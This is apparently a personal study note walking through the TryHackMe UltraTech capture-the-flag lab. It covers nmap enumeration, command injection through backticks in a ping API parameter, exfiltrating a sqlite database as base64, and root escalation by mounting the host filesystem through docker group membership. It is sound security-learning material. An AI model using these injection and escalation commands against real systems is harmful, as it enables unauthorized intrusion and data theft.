
2024-07-11 20:46

Source: #web #youtube #privesc 

Tags: [[nmap]]
#### Enumeration 
```
nmap -sCV -v $IP 
```
non-standard port in use?
```
nmap -p- -v $IP
```
1. we find 31331 
2. 8081 has a website hosted that isn't leading anywhere so we try 31331, there we have a proper webpage of ultratech 
3. going to robots.txt we find the site map
#### Exploitation 

we see there is an `api` running that helps in pinging 
```
curl 'http://<ip.address>:8081/ping?ip=`whoami`'
```
above command would otherwise be used to ping an IP address but here with command substitution we can perform command [[injection]] 

since we have an API running we can use `/health` and `/status`

in order to get the data of the [[database]] we try to return the value as a base64 encoding 
```
10.10.65.179:8081/ping?ip=`base64 -w 0 utech.db.sqlite`
```
`-w 0` to make it all one long line
save the file with `.b64` extension the decode it using `base64 -d file.b64

check if a service is available on a machine or not by using - `which service_name`

we can try character escape by using `\|` 
#### Escalation

```
find / -perm -4000 2>/dev/null
```

if nothing sticks out from the above command 
1. go to the `opt` directory  
2. we find `containerd` dir 
3. check the group we are in by using `id` command 
since we are in the docker group we can use find exploits in gtfobins for [[docker]] 
- find local docker images using `docker images`
- run the below command further (bash is the local image found on the machine)
```
docker run -v /:/mnt --rm -it bash
```

### References
[TryHackMe | UltraTech](https://tryhackme.com/r/room/ultratech1)

video soln- 
https://www.youtube.com/watch?v=b8hUHRus6cw

[TryHackMe - Ultratech – sckull](https://sckull.github.io/posts/ultratech/#ftp-ssh)